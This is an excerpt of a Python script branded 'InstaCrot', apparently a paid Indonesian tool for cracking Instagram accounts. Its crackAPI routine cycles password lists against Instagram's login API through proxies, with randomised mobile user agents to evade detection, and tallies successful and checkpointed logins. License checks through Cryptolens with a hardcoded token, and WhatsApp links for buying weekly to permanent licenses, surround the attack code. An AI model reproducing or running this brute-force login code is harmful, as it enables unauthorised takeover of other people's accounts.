...
for tu in range(1000):
            ...
            E = random.randrange(4,13)
            F = random.randrange(3,10)
            G = random.randrange(111111,999999)
            UserAgentss = f'Mozilla/5.0 (Linux; Android {E}; {A} Build/PPR1.{G}.029; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{B}.0.{C}.{D} Mobile Safari/537.36'
...
{M2}⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⢹⣿⣆  
{M2}⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠛⠻⢿⣿⣿⣷⣶⣾⣿⣿ 
{M2}⣿⣿⣿⣿⣿⡿⠋⠀⠀⣀⣠⣄⣀⠀⠀⠙⢿⣿⣿⣿⣿⣿  {M2}___   _  _   ___   _____   _     ___   ___     _     __  __ {P2}    
{M2}⣿⣿⣿⣿⣿⠁⠀⢠⣾⣿⣿⣿⣿⣷⡄⠀⠈⣿⣿⣿⣿⣿ {M2}|_ _| |    | / __| |_   _| /_\   / __| | _ \   /_\   |  \/  |    {P2}
{P2}⣿⣿⣿⣿⡇⠀⠀⢾⣿⣿⣿⣿⣿⣿⡷⠀⠀⢸⣿⣿⣿⣿  {P2}| |  | .` | \__ \   | |  / _ \ | (_ | |   /  / _ \  | |\/| |    {P2}       
{P2}⣿⣿⣿⣿⣿⡀⠀⠘⢿⣿⣿⣿⣿⡿⠃⠀⢀⣿⣿⣿⣿⣿ {P2}|___| |_|\_| |___/   |_| /_/ \_\ \___| |_|_\ /_/ \_\ |_|  |_| {P2}      
{P2}⣿⣿⣿⣿⣿⣷⣄⠀⠀⠉⠙⠋⠉⠀⠀⣠⣾⣿⣿⣿⣿⣿       
{P2}⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿            
{P2}⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏       
{P2}⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁  

\t\t     {K2} InstaCrot {P2}|{H2} DEV RecodeTeam """,title=f"{R2}{waktu()}",width=150, padding=(0,1),style=f"{color_table}"))
...
def _LoginCookie_():
    if "sukses" in lisensiku:
        try:
          ...
          prints(Panel(f"{P2}jangan gunakan akun pribadi anda untuk login ke InstaCrot",width=80,padding=(0,9),style=f"{color_table}"))
...
class instagram:
	...
	def crackAPI(self,user,pas):
		...
		sys.stdout.write(f"\r {K}#{P} {H}stabil{P} {loop}/{len(internal)} Ok-:{H}{len(success)} {P}Cp-:{K}{len(checkpoint)} {P}"),sys.stdout.flush()
		try: 
			for pw in pas:
				...
				respon = ses.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = headd, data = date, proxies = proxy, allow_redirects = True)
...
def tlisensi():
    ...
    if lisen in ['']:
     ...
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/+6285724355319?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
...
def lisensi():
 try:
  ...
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzOTQyOTEzMSIsIlk4WkFFVU5ac0U3ZjJHRmVnZWU2VmdxKzRDVEdLc09IYWNGYk0ybkUiXQ==&ProductId=19017&Key='+lisensikuni[0]).json()
...
def key():
	...
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzOTQyOTEzMSIsIlk4WkFFVU5ac0U3ZjJHRmVnZWU2VmdxKzRDVEdLc09IYWNGYk0ybkUiXQ==&ProductId=19017&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server InstaCrot",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzOTQyOTEzMSIsIlk4WkFFVU5ac0U3ZjJHRmVnZWU2VmdxKzRDVEdLc09IYWNGYk0ybkUiXQ==&ProductId=19017&Key=%s"%(x)).json()['licenseKey']['key'];_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
...
def key():
	os.system("clear") 
	banner()
	prints(Panel(f"{P2}Admin tidak bertanggung jawab atas penyalahgunaan tools ini, jika tidak mengerti menggunakan tools ketik ( {H2}ADMIN {P2})  ",title=f"{M2}• {K2}• {H2}• {P2}INFORMASI {H2}• {K2}• {M2}•",width=80,padding=(0,2),style=f"{color_table}"))
	key = input(f" {H}• {P}masukan lisensi :{H} ")
	if key in ["beli","Beli","BELI"]:beli_bang()
	elif key in ["admin","Admin","ADMIN"]:AdminAdtya()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzOTQyOTEzMSIsIlk4WkFFVU5ac0U3ZjJHRmVnZWU2VmdxKzRDVEdLc09IYWNGYk0ybkUiXQ==&ProductId=19017&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}Selamat Lisensi Yang Anda Masukan Terdaftar Ke Server InstaCrot",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);_loginPILL_()
	except KeyError:
		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
...
def AdminAdtya():
    try:
        ...
        os.system("xdg-open https://wa.me/+6285724355319");exit()
    except:pass
...
def beli_bang():
    ...
    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6285724355319?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
